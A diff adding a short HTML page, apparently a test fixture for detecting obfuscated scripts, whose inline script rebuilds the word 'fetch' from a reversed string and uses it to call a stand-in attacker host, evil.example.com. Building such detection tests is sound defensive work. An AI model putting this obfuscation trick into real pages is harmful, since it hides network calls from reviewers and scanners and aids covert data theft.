@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Split Reverse Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: Reverse string to hide fetch
+    const fn = 'hctef'.split('').reverse().join('');
+    window[fn]('https://evil.example.com/data');
+  </script>
+</body>
+</html>
